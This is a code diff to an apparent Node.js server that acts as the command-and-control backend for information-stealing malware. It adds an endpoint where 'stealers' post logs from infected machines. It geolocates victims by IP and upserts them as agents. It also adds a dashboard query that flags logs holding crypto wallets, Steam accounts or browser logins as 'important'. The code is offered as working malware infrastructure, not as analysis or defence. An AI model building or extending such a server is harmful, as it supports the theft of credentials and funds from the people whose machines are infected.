@@ -9,6 +9,7 @@ import crypto from 'crypto';
 import fs from 'fs';
 import multer from 'multer';
 import { fileURLToPath } from 'url';
+import geoip from 'geoip-lite';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -153,6 +154,7 @@ async function initDatabase() {
                 username VARCHAR(255),
                 os_info TEXT,
                 ip_address VARCHAR(45),
+                country_code VARCHAR(2),
                 last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 status ENUM('active', 'inactive', 'compromised') DEFAULT 'active',
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
@@ -1493,6 +1495,87 @@ app.post('/api/c2/upload-result', upload.single('file'), async (req, res) => {
     } catch (error) {
         console.error('Failed to process file upload result:', error);
     }
+});
+
+// Endpoint for stealers to post log data
+app.post("/api/c2/log", async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    const { agent_id, hostname, username, log_type, data } = req.body;
+    const ip_address = req.ip;
+
+    if (!agent_id || !hostname || !username || !log_type || !data) {
+        return res.status(400).json({ error: "Missing required log data" });
+    }
+    
+    // IP Geolocation
+    const geo = geoip.lookup(ip_address);
+    const country_code = geo ? geo.country : 'XX';
+
+    let conn;
+    try {
+        conn = await pool.getConnection();
+
+        // 1. Insert or Update the agent
+        await conn.query(`
+            INSERT INTO c2_agents (agent_id, hostname, username, ip_address, country_code, last_seen, status)
+            VALUES (?, ?, ?, ?, ?, NOW(), 'active')
+            ON DUPLICATE KEY UPDATE
+            hostname = VALUES(hostname),
+            username = VALUES(username),
+            ip_address = VALUES(ip_address),
+            country_code = VALUES(country_code),
+            last_seen = NOW(),
+            status = 'active'
+        `, [agent_id, hostname, username, ip_address, country_code]);
+
+        // 2. Insert the log
+        await conn.query(`
+            INSERT INTO c2_logs (agent_id, hostname, username, log_type, data)
+            VALUES (?, ?, ?, ?, ?)
+        `, [agent_id, hostname, username, log_type, JSON.stringify(data)]);
+        
+        res.status(200).json({ status: "success", message: "Log received" });
+
+    } catch (err) {
+        console.error("Error processing C2 log:", err);
+        res.status(500).json({ error: "Internal server error" });
+    } finally {
+        if (conn) conn.release();
+    }
+});
+
+// Get C2 statistics (for dashboard)
+app.get("/api/admin/c2/stats/logs-by-day", authenticateAdmin, async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+    
+    try {
+        const [rows] = await pool.query(`
+            SELECT 
+                DATE(created_at) as date,
+                SUM(CASE WHEN log_type IN ('wallets', 'steam') OR (log_type = 'browsers' AND JSON_LENGTH(data, '$.logins') > 0) THEN 1 ELSE 0 END) as important,
+                SUM(CASE WHEN log_type NOT IN ('wallets', 'steam') AND (log_type != 'browsers' OR JSON_LENGTH(data, '$.logins') = 0) THEN 1 ELSE 0 END) as regular
+            FROM c2_logs
+            WHERE created_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)
+            GROUP BY DATE(created_at)
+            ORDER BY date ASC
+        `);
+        res.json(rows);
+    } catch (err) {
+        console.error("Error fetching daily log stats:", err);
+        res.status(500).json({ error: "Internal server error" });
+    }
+});
+
+// Get C2 statistics (for dashboard)
+app.get("/api/c2/stats", authenticateAdmin, async (req, res) => {
+  try {
+    const conn = await pool.getConnection();
+    // ... existing code ...
+  } catch (err) {
+    console.error("Error fetching C2 statistics:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
 });
 
 // Fallback route for SPA
